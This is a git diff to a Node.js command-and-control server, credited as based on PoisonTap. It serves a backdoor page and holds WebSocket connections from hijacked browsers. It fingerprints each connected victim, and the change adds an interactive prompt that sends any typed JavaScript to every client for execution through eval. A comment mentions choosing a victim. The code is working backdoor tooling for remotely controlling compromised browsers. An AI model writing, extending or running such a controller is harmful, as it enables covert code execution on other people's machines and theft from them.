@@ -1,18 +1,18 @@
 // CREDITS
-// based on PoisonTap by Samy Kamkar
+// start of project based on PoisonTap by Samy Kamkar
 
+//SERVER
 //var _ = require('underscore')
 var WebSocketServer = require('websocket').server
 var webSocketsServerPort = 1337
 var fs = require('fs');
-var inquirer = require('inquirer');
 var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
 var http = require('http')
 var conns = []
 var gr
 var server = http.createServer((request, response) => {
 
-  //console.log((new Date()) + ' HTTP server. URL ' + request.url + ' requested.')
+  //output((new Date()) + ' HTTP server. URL ' + request.url + ' requested.')
 
   if (request.url.indexOf('/exec?') === 0)
   {
@@ -56,7 +56,8 @@ var server = http.createServer((request, response) => {
   }
 })
 server.listen(webSocketsServerPort, () => {
-  console.log((new Date()) + " Server is listening on port " + webSocketsServerPort)
+  output((new Date()) + " Server is listening on port " + webSocketsServerPort )
+  start_interface();
 })
 
 // create the server
@@ -67,7 +68,7 @@ function handleresponse(obj, con)
 {
 	//HERE WHAT TO DO WITH RESPONSES FROM CLIENTS
 	if ("fingerprint" in obj) {
-		console.log(obj.fingerprint);
+		output("fingerprint: "+obj.fingerprint);
 	}
 	// TODO use for merging with connections for info // if ("components" in obj) {
 
@@ -84,13 +85,14 @@ function ask_fingerprint_info(connection)
 	connection.sendUTF(JSON.stringify({ request: 'eval', content: command }))  
 }
 
+//REQUESTS
 wsServer.on('request', (request) => {
   var obj
   var connection = request.accept(null, request.origin)
   conns.push(connection)
 
   connection.on('request', (message) => {
-    console.log('request: ' + message)
+    output('request: ' + message)
   })
 
   connection.on('message', (message) => {
@@ -103,14 +105,14 @@ wsServer.on('request', (request) => {
     else
 	  {
 		//TODO give name of connection (with using the connection var to the left
-		console.log('message: ' + message.utf8Data);
+		output('message: ' + message.utf8Data);
 	  }
 
   })
 
   // remove connection from our list
   connection.on('close', connection => {
-    console.log('connection closed')
+    output('connection closed')
     for (var i in conns)
       if (conns[i] == connection)
       //if (_.isEqual(conns[i], connection)) // XXX
@@ -120,50 +122,45 @@ wsServer.on('request', (request) => {
   ask_fingerprint_info(connection);
 })
 
-//START interface
-var stdin = process.openStdin();
-//TODO list help en start here (make function to be recalled)
-console.log("");
-console.log("Typed javascript-commands will be sent to all connected clients");
-
-/*
-stdin.addListener("data", function(d) {
-	var command = d.toString().trim();
-	//TODO TEMP SEND TO ALL -> later make layers and choose victim (not like this)
-	for (var i in conns)
-		conns[i].sendUTF(JSON.stringify({ request: 'eval', content: command }))
-	console.log("COMMAND SENT: "+command);
-});
-*/
-
-/*
-inquirer([{name: 'command', message: '>>>'}], function(answers){
-
-	 console.log(answers); //an object containing the user response.
-
-});
-*/
-/*
-function input() {
-	inquirer.prompt([{name: 'command', message: '>>>'}]).then(answers => {
-		 console.log(answers); //an object containing the user response.
-		//repeat
-		input();
-	});
-}
-*/
+//INTERFACE
 var prompt = require('prompt');
+var colors = require("colors/safe");
 prompt.message = "";
 prompt.delimiter = "";
 
- var colors = require("colors/safe");
+function input() {
+	//TODO check if already active
+	//prompt.stop();
+	prompt.start();
+	prompt.get({properties: {command:{description: ">>>"}}}, function (err, result) {
+		if (result != null) {
+			process_command(result.command);
+			input();
+		} else {
+			process.exit();
+		}
+	});
+}
+function output(text) {
+	console.log("");
+	console.log(text);
+	//console.log("");
+}
+function start_interface() {
+	console.log("Typed javascript-commands will be sent to all connected clients");
+	input()
+}
 
-// Start the prompt
-prompt.start();
-
-//
-// Get two properties from the user: username and email
-//
-prompt.get({properties: {command:{description: ">>>"}}}, function (err, result) {
-  console.log('command: ' + result.command);
-});
+//PROCESSING OF COMMANDS
+function process_command(command) {
+	//different commands here -> make layer system
+	for (var i in conns)
+		conns[i].sendUTF(JSON.stringify({ request: 'eval', content: command }))
+	if (command!="") {
+		if (command == "conns") {
+			console.log(conns);
+		} else { 
+			output("Command sent: "+command);
+		}
+	}
+}
